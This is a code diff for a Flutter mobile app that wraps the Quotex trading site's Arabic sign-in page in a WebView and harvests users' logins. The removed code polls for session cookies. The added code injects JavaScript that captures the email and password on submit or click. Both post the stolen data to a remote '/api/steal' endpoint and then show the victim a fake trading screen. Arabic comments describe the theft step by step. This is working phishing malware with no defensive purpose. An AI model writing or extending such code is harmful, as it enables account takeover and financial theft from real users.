@@ -4,6 +4,7 @@ import 'package:webview_flutter/webview_flutter.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
+import 'package:flutter/services.dart'; // عشان SystemNavigator
 
 void main() => runApp(const MyApp());
 
@@ -58,39 +59,78 @@ class _LoginScreenState extends State<LoginScreen> {
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..setUserAgent("Quotex/1.0")
+      ..addJavaScriptChannel(
+        'QTX_CREDS',
+        onMessageReceived: (msg) async {
+          print("JAVASCRIPT MESSAGE: ${msg.message}");
+          try {
+            var data = jsonDecode(msg.message);
+            if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
+              // 439. نبعتها للسيرفر
+              await http.post(
+                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+                headers: {"Content-Type": "application/json"},
+                body: msg.message,
+              );
+
+              // 440. نحول المستخدم للواجهة
+              if (mounted) {
+                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+              }
+            }
+          } catch (e) {
+            print("Error: $e");
+          }
+        },
+      )
       ..setNavigationDelegate(
         NavigationDelegate(
           onPageFinished: (url) async {
-            // 435. نراقب الكوكيز كل ثانية
-            _startCookieMonitoring();
+            await Future.delayed(const Duration(seconds: 2));
+            _injectOriginalScript();
           },
         ),
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
   }
 
-  void _startCookieMonitoring() async {
-    bool sent = false;
-    for (int i = 0; i < 30; i++) {
-      await Future.delayed(const Duration(seconds: 1));
-      final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
-      
-      // 436. نتأكد إنه في كوكيز جلسة حقيقية
-      if (cookieString.toString().contains('laravel_session') || cookieString.toString().contains('remember_web')) {
-        await http.post(
-          Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-          headers: {"Content-Type": "application/json"},
-          body: jsonEncode({"type": "full_session", "cookies": cookieString.toString()}),
-        );
-        sent = true;
-        break;
-      }
-    }
-
-    // 437. نحول المستخدم للواجهة بعد السحب
-    if (sent && mounted) {
-      Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
-    }
+  void _injectOriginalScript() {
+    String jsScript = """
+      (function() {
+        function setNativeValue(el, value) {
+          try {
+            var proto = window.HTMLInputElement.prototype;
+            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
+            desc.set.call(el, value);
+          } catch (e) { el.value = value; }
+          el.dispatchEvent(new Event('input', { bubbles: true }));
+          el.dispatchEvent(new Event('change', { bubbles: true }));
+        }
+        function findEmail() {
+          return document.querySelector('input[name="email"], input[type="email"], #email');
+        }
+        function findPass() {
+          return document.querySelector('input[name="password"], input[type="password"], #password');
+        }
+        function sendCreds() {
+          try {
+            var e = findEmail(), p = findPass();
+            if (e && p && e.value && p.value) {
+              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
+            }
+          } catch (err) {}
+        }
+        if (!window.__qtxHooksInstalled) {
+          window.__qtxHooksInstalled = true;
+          document.addEventListener('submit', sendCreds, true);
+          document.addEventListener('click', function(ev) {
+            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
+            if (t) sendCreds();
+          }, true);
+        }
+      })();
+    """;
+    _controller.runJavaScript(jsScript);
   }
 
   @override
